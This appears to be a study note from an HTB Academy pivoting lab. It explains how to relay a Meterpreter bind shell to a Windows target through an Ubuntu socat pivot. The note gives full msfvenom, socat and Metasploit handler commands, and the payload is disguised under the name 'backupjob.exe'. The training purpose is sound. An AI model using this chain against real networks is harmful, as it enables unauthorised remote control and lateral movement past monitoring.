# Pivoting, Tunneling, and Port Forwarding — Socat Redirection with a Bind Shell

**Module:** HTB Academy – Pivoting, Tunneling, and Port Forwarding

---

## Bind Shell vs. Reverse Shell (Redirection Context)

- Previously covered: **socat reverse shell redirector** — Windows target connects **back** to the Ubuntu pivot, which forwards to the attack host.
- **Bind shell** = opposite direction of initiation: the **Windows server starts a listener** and binds to a specific port, waiting for an incoming connection.
- Pivot setup: a **socat redirector** on the Ubuntu server **listens for incoming connections from the Metasploit bind handler** (on the attack host) and **forwards them to the Windows target's bind shell payload**.

---

## Step 1 — Create the Windows Bind Payload

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

- No `LHOST` needed — the payload **listens locally** on the Windows target (`LPORT=8443`), it doesn't call out.

---

## Step 2 — Start the Socat Bind Shell Listener (on the Ubuntu Pivot)

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

- Listens on the pivot's port **8080**.
- `fork` → handles multiple/sequential connections.
- Forwards all accepted connections to `172.16.5.19:8443` — the Windows target's bind shell port.

---

## Step 3 — Configure & Start the Metasploit Bind Handler (on the Attack Host)

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
# Started bind TCP handler against 10.129.202.64:8080
```

- `RHOST` = the **Ubuntu pivot's** IP (where socat is listening) — NOT the Windows target directly.
- `LPORT` = **8080** — matches socat's listening port on the pivot.
- The handler connects **out to** the pivot's socat listener, which in turn connects to the Windows bind payload.

## Connection Flow Summary

```
Attack Host (Metasploit bind handler)
        │  connects to Ubuntu pivot:8080
        ▼
Ubuntu Pivot (socat: TCP4-LISTEN:8080,fork → forwards to 172.16.5.19:8443)
        │  connects to Windows target:8443
        ▼
Windows Target (bind_tcp payload listening on 8443)
```

- Attack host initiates the connection → pivot's socat relay → Windows target's bind listener.
- This is the **reverse direction of initiation** compared to a reverse-shell redirector, where the **target** initiates toward the pivot.

---

## Key Takeaways

| Component | Role | Listens On | Connects To |
|---|---|---|---|
| Windows payload (`bind_tcp`) | Waits for inbound connection | `8443` (local to target) | — |
| Socat (Ubuntu pivot) | Relay | `8080` | `172.16.5.19:8443` |
| Metasploit bind handler (attack host) | Initiates connection | — | `10.129.202.64:8080` (pivot) |

- Use a **bind handler** (not a reverse handler) when the Metasploit payload itself is `bind_tcp`.
- `RHOST` on the handler must point to the **pivot**, since that's where the relay (socat) is actually listening — the handler never talks to the Windows target directly.
- This technique is useful when outbound connections from the target are restricted/monitored but **inbound listeners on the target are achievable**, and you need to relay through an intermediary pivot to reach it.
